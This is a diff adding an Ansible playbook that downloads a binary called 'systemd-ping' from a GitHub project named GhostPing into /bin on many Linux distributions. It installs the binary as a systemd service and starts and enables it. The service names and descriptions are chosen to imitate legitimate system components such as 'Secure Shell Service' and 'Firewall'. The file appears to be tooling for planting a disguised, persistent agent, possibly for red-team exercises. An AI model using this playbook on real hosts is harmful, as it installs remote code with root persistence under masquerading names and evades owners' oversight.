@@ -1,0 +1,64 @@
+- name: Linux Deploy Playbook
+  hosts: all
+  become: yes
+  tasks:
+  - name: Linux Deploy | Define Distributions
+    set_fact:
+      linux_distros: ["Debian", "RedHat", "CentOS", "Fedora", "Scientific", "CloudLinux", "OracleLinux", "Amazon", "XenServer", "Ubuntu", "SUSE", "SLED", "SLES", "Gentoo", "Archlinux", "Mandrake", "Alpine"]
+
+  - name: Linux Deploy | Define Paths, File/Service Names, and Service Descriptions
+    set_fact:
+      linux_path: "/bin/"
+      linux_file_names: ["systemd-ping"]
+      linux_service_descriptions: ["Secure Shell Service", "Secure Container for snapd", "Load AppArmour profiles", "User Login Management for SSH", "Firewall"]
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Select Random Index for Service Name and Description
+    set_fact:
+      linux_random_index: "{{ range(0, linux_file_names | length) | random }}"
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Select Random File/Service Name and Description
+    set_fact:
+      linux_random_file_name: "{{ linux_file_names[linux_random_index | int] }}"
+      linux_random_service_description: "{{ linux_service_descriptions[linux_random_index | int] }}"
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Download Agent
+    get_url:
+      url: https://github.com/miller-js/GhostPing/releases/download/v1.0.0/systemd-ping
+      dest: "{{ linux_path }}{{ linux_random_file_name }}"
+      mode: '0755'
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Download Service File
+    get_url:
+      url: https://raw.githubusercontent.com/miller-js/GhostPing/refs/heads/main/deploy/client.service
+      dest: "/lib/systemd/system/{{ linux_random_file_name }}.service"
+      mode: 644
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Edit Service File
+    ansible.builtin.lineinfile:
+      path: "/lib/systemd/system/{{ linux_random_file_name }}.service"
+      regexp: "ExecStart=/bin/systemd-ping"
+      line: "ExecStart={{ linux_path }}{{ linux_random_file_name }}"
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Reload Service Daemons
+    systemd:
+      daemon_reload: yes
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Stop Service
+    service:
+      name: "{{ linux_random_file_name }}"
+      state: stopped
+    when: ansible_os_family in linux_distros
+
+  - name: Linux Deploy | Start and Enable Service
+    service:
+      name: "{{ linux_random_file_name }}"
+      enabled: yes
+      state: started
+    when: ansible_os_family in linux_distros
